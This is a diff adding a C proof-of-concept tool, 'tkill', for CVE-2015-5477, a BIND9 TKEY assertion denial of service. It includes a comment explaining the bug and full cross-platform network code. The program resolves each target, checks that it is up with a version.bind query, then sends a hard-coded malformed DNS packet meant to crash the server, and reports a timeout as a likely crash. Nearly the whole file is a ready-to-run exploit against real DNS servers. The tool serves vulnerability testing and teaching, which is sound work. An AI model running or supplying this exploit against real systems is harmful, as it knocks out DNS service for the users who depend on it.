@@ -1,0 +1,469 @@
+/*
+    PoC for BIND9 TKEY assert Dos (CVE-2015-5477)
+
+    Usage:
+        tkill <hostname>
+
+    What it does:
+        - First sends a "version" query to see if the server is up.
+        - Regardless of the version response, it then sends the DoS packet.
+        - Then it waits 5 seconds for a response. If the server crashes,
+          there will be no response.
+
+    Notes:
+        - multiple hostnames can be specified on the command-line
+        - IP addresses can be specified instead of hostnames
+        - supports IPv4 and IPv6
+        - runs on Linux, Mac, and Windows (cygwin or VisualStudio)
+        - if a hostname resolves to more than one IP, then all IPs
+          will be probed
+
+    About the vuln:
+        For control information, the "TSIG" feature allows packets to be
+        signed with a password. This allows slave servers to get updates
+        from master servers without a MitM attack (like from the NSA)
+        changing the data on the network.
+
+        A password can be distributed out of band, such as SSHing into
+        a box and editing the configuration file. Anther way is through
+        public-keys. That's the "TKEY" feature: it distributes new
+        TSIG passwords using public-keys.
+
+        When processing a TKEY packet, the code will call a function to
+        fetch the proper TKEY record. It looks in two places: the
+        "answer records" section, and the "additional records" section.
+        If it can't find it in the "additional", it looks in "answer".
+
+        The lookup function takes a parameter that is initially set
+        to NULL. During the failed lookup in the "additional" section,
+        it may set that parameter to a non-null value. Since a non-null
+        value is passed in again during the second lookup in the "answer"
+        section, the code crashes.
+
+        The patch was to set the variable to NULL before the second lookup.
+
+        The correct fix would simply not check to see if the parameter
+        was NULL to be begin with. It's an out-only parameter, so it's value
+        on input doesn't matter.
+
+        This is a just a "brainfart" bug that can only result in a crash
+        of the server. It cann't result in data-corruption or code
+        execution.
+
+    About this code:
+        To learn about writing network code, this is probably something useful
+        to study.
+
+        It works on both Windows and Unix (Linux, Mac, etc.). You can see where
+        the differences are between the two platforms, as well as the simularities.
+
+        It works on both IPv4 and IPv6. However, if you search through the code,
+        you'll find nothing that specifically references either version. It's
+        magically dual-stack. That's because it uses new functions like
+        "getaddrinfo()" instead of old functions like "gethostbyname()".
+        
+Source: https://raw.githubusercontent.com/robertdavidgraham/cve-2015-5477/master/tkill.c
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <ctype.h>
+
+#ifdef WIN32
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
+#define WSA(err) (WSA##err)
+#define WSAEAGAIN WSAETIMEDOUT
+#else
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <errno.h>
+#define WSAGetLastError() (errno)
+#define WSA(err) (err)
+#define closesocket(fd) close(fd)
+#endif
+
+/*
+ * DoS packet that will crash server
+ */
+static const unsigned char dospacket[] = {
+        0x01, 0x02, /* xid */
+        0x01, 0x00, /* query */
+        0x00, 0x01, /* one question */
+        0x00, 0x00, /* no answer */
+        0x00, 0x00, /* no authorities */
+        0x00, 0x01, /* one additional: must be 'additional' section to work*/
+
+        /* Query name */
+        0x03, 'f', 'o', 'o', 0x03, 'b', 'a', 'r', 0x00,
+        0x00, 249, /* TKEY record type */
+        0x00, 255,
+
+        /* Additional record  */
+        0x03, 'f', 'o', 'o', 0x03, 'b', 'a', 'r', 0x00, /* name: must be same as query */
+        0x00, 16, /* record type: must NOT be 249/TKEY */
+        0x00, 255,
+        0, 0, 0, 0,
+        0, 51,
+            50,
+            'h', 't', 't', 'p', 's', ':', '/', '/', 
+            'g', 'i', 't', 'h', 'u', 'b', '.', 'c', 
+            'o', 'm', '/', 'r', 'o', 'b', 'e', 'r', 
+            't', 'd', 'a', 'v', 'i', 'd', 'g', 'r', 
+            'a', 'h', 'a', 'm', '/', 'c', 'v', 'e', 
+            '-', '2', '0', '1', '5', '-', '5', '4', 
+            '7', '7'
+};
+
+
+/*
+ * Packet for querying the version of the server, to test if it's up
+ */
+static const unsigned char versionpacket[] = {
+        0x03, 0x04, /* xid */
+        0x01, 0x00, /* query */
+        0x00, 0x01, /* one question */
+        0x00, 0x00, /* no answer */
+        0x00, 0x00, /* no authorities */
+        0x00, 0x00, /* no additional */
+
+        /* Query name */
+        0x07, 'v', 'e', 'r', 's', 'i', 'o', 'n', 0x04, 'b', 'i', 'n', 'd', 0x00,
+        0x00, 16, /* TXT */
+        0x00, 3,    /* CHOAS */
+};
+
+
+/*
+ * YOLO BIND version.bind query
+ */
+int query_version(int fd, const struct addrinfo *target)
+{
+    int bytes_received;
+    int i;
+    struct sockaddr_storage from;
+    socklen_t sizeof_from = sizeof(from);
+    char hostname[256];
+    unsigned char buf[2048];
+    int result = 0;
+
+    /* 
+     * Query version 
+     */
+    sendto(fd, (const char*)versionpacket, sizeof(versionpacket), 0, 
+            target->ai_addr, target->ai_addrlen);
+
+
+    /* 
+     * get response 
+     */
+again:
+    bytes_received = recvfrom(fd, (char*)buf, sizeof(buf), 0, (struct sockaddr*)&from, &sizeof_from);
+    if (bytes_received <= 0 && WSAGetLastError() == WSA(EAGAIN)) {
+        fprintf(stderr, "[-] timed out getting version, trying again\n");
+        return 0;
+    } else if (bytes_received <= 0) {
+        fprintf(stderr, "[-] unknown error receiving response: %u\n", WSAGetLastError());
+        return 0;
+    }
+    getnameinfo((struct sockaddr*)&from, sizeof(from), hostname, sizeof(hostname), NULL, 0, NI_NUMERICHOST);
+
+    /* 
+     * parse response 
+     */
+    if (bytes_received < 12)
+        goto again;
+    if (buf[0] != versionpacket[0] && buf[1] != versionpacket[1])
+        goto again;
+    if ((buf[2]&0x80) != 0x80)
+        goto again;
+
+    /*
+     * Handle respoonse code 
+     */
+    switch (buf[3]&0x0F) {
+    case 0:
+        /* parse packet below */
+        break;
+    case 1:
+        fprintf(stderr, "[-] %s: FORMERR\n", hostname);
+        return 1;
+    case 2:
+        fprintf(stderr, "[-] %s: SRVFAIL\n", hostname);
+        return 1;
+    case 3:
+        fprintf(stderr, "[-] %s: NAMERR\n", hostname);
+        return 1;
+    case 4:
+        fprintf(stderr, "[-] %s: NOTIMPL\n", hostname);
+        return 1;
+    case 5:
+        fprintf(stderr, "[-] %s: REFUSED\n", hostname);
+        return 1;
+    default:
+        fprintf(stderr, "[-] %s: unknown error: %u\n", hostname, buf[3]);
+        return 1;
+    }
+
+
+    i = 12; /* skip header */
+
+    /* 
+     * skip query name 
+     */
+    while (i < bytes_received) {
+        if (buf[i] == 0) {
+            i++;
+            break;
+        } else if ((buf[i] & 0xC0) == 0xC0) {
+            i += 2;
+            break;
+        } else {
+            i += buf[i] + 1;
+        }
+    }
+    i += 4;
+
+    /* 
+     * process all answers 
+     */
+    while (i + 12 <= bytes_received) {
+        int t, c, len;
+
+        /* skip answer name */
+        while (i < bytes_received) {
+            if (buf[i] == 0) {
+                i++;
+                break;
+            } else if ((buf[i] & 0xC0) == 0xC0) {
+                i += 2;
+                break;
+            } else {
+                i += buf[i] + 1;
+            }
+        }
+
+        /* extract resource-recorder header */
+        if (i + 10 > bytes_received)
+            break;
+        t = buf[i+0]<<8 | buf[i+1];
+        c = buf[i+2]<<8 | buf[i+3];
+        len = buf[i+8]<<8 | buf[i+9];
+        i += 10;
+
+        /* verify TXT CHAOS */
+        if (t != 16 || c != 3) {
+            i += len;
+            continue;
+        }
+
+        /* fix len */
+        if (len > bytes_received - i)
+            len = bytes_received - i;
+
+        /* print the hostname */
+        fprintf(stderr, "[+] %s: ", hostname);
+
+        /* print the strings */
+        {
+            int j = i;
+
+            i += len;
+
+            while (j < i) {
+                int len2 = buf[j];
+                int k;
+                j++;
+                if (len2 > bytes_received - len2)
+                    len2 = bytes_received - len2;
+                fprintf(stderr, "\"");
+
+                for (k=j; k<j+len2; k++) {
+                    if (buf[k] == '\\')
+                        fprintf(stderr, "\\");
+                    else if (!isprint(buf[k]))
+                        fprintf(stderr, "\\x%02x", buf[k]);
+                    else
+                        fprintf(stderr, "%c", buf[k]);
+                }
+
+                j = k;
+
+                fprintf(stderr, "\" ");
+            }
+            fprintf(stderr, "\n");
+        }
+        result = 1;
+    }
+    return result;
+}
+
+/*
+ * Send the DoS packet
+ */
+void probe(const struct addrinfo *target)
+{
+    int fd;
+    int x;
+    int i;
+    char hostname[256];
+    char buf[2048];
+    struct sockaddr_storage from;
+    socklen_t sizeof_from = sizeof(from);
+    
+        
+    /*
+     * Print status
+     */
+    getnameinfo(target->ai_addr, target->ai_addrlen, hostname, sizeof(hostname), NULL, 0, NI_NUMERICHOST);
+    fprintf(stderr, "[+] %s: Probing...\n", hostname);
+
+    /*
+     * Create a socket
+     */
+    fd = socket(target->ai_family, SOCK_DGRAM, 0);
+    if (fd <= 0) {
+        fprintf(stderr, "[-] failed: socket(): %u\n", WSAGetLastError());
+        return;
+    }
+
+    /*
+     * Set the timeout to 5-seconds
+     */
+    {
+#ifdef WIN32
+        int milliseconds = 5000;
+        x = setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&milliseconds, sizeof(milliseconds));
+#else
+        struct timeval t;
+        t.tv_sec = 5;
+        t.tv_usec = 0;
+        x = setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&t, sizeof(t));
+#endif
+
+        if (x != 0) {
+            fprintf(stderr, "[-] err setting recv timeout: %u\n", WSAGetLastError());
+        }
+    }
+
+
+    /*
+     * First, query the server to grab its version, but also to see it's up
+     */
+    fprintf(stderr, "[+] Querying version...\n");
+    for (i=0; i<3; i++) {
+        if (query_version(fd, target))
+            break;
+        if (i == 2) {
+            fprintf(stderr, "[-] Can't query server, is it crashed already?\n");
+            fprintf(stderr, "[-] Sending exploit anyway.\n");
+        }
+    }
+
+
+    /*****************
+     * SEND DoS PACKET
+     *****************/
+    fprintf(stderr, "[+] Sending DoS packet...\n");
+    sendto(fd, (const char*)dospacket, sizeof(dospacket), 0, target->ai_addr, target->ai_addrlen);
+
+    /* Grab response */
+    fprintf(stderr, "[+] Waiting 5-sec for response...\n");
+    for (;;) {
+        x = recvfrom(fd, (char*)buf, sizeof(buf), 0, (struct sockaddr*)&from, &sizeof_from);
+        if (x <= 0 && WSAGetLastError() == WSA(EAGAIN)) {
+            fprintf(stderr, "[+] timed out, probably crashed\n");
+            break;
+        } else if (x <= 0) {
+            fprintf(stderr, "[-] unknown error receiving response: %u\n", WSAGetLastError());
+            break;;
+        }
+
+        if (x > 2 && (buf[0] != dospacket[0] || buf[1] != dospacket[1]))
+            continue;
+        
+        getnameinfo((struct sockaddr*)&from, sizeof(from), hostname, sizeof(hostname), NULL, 0, NI_NUMERICHOST);
+        fprintf(stderr, "[-] %s: got response, so probably not vulnerable\n", hostname);
+        break;
+    }
+
+
+    closesocket(fd);
+}
+
+
+/*
+ * The main function just parses the arguments and looks up IP addrsses
+ * before calling the "probe" function to actually exploit the targets
+ */
+int main(int argc, char *argv[])
+{
+    int i;
+
+#ifdef WIN32
+    {WSADATA x; WSAStartup(0x101, &x);}
+#endif
+
+    fprintf(stderr, "--- PoC for CVE-2015-5477 BIND9 TKEY assert DoS ---\n");
+
+    if (argc <= 1) {
+        fprintf(stderr, "[-] no host specified\n");
+        fprintf(stderr, "usage:\n tkill <hostname>\n");
+        return -1;
+    }
+
+
+    /*
+     * Query all targets specified on the command line
+     */
+    for (i=1; i<argc; i++) {
+        const char *hostname = argv[i];
+        struct addrinfo *info;
+        struct addrinfo *target;
+        char oldtarget[256] = "";
+        int x;
+
+        /*
+         * Lookup the name of the target
+         */
+        fprintf(stderr, "[+] %s: Resolving to IP address\n", hostname);
+        x = getaddrinfo(hostname, "53", 0, &info);
+        if (x != 0) {
+            fprintf(stderr, "[-] %s: failed: %s\n", hostname, gai_strerror(x));
+            continue;
+        }
+
+        if (info->ai_next) {
+            fprintf(stderr, "[+] %s: Resolved to multiple IPs (NOTE)\n", hostname);
+        }
+
+        /*
+         * Since a name can return multiple IP addresses,
+         * send a probe to all the results
+         */
+        for (target=info; target; target = target->ai_next) {
+            char newtarget[256];
+
+            /* bah, stupid bug in Linux gets the same target multiple
+             * times */
+            getnameinfo(target->ai_addr, target->ai_addrlen, newtarget, sizeof(newtarget), NULL, 0, NI_NUMERICHOST);
+            if (strcmp(newtarget, oldtarget) == 0)
+                continue;
+            memcpy(oldtarget, newtarget, sizeof(oldtarget));
+
+            probe(target);
+            printf("\n");
+        }
+
+        /*
+         * Cleanup
+         */
+        freeaddrinfo(info);
+    }
+
+    return 0;
+}
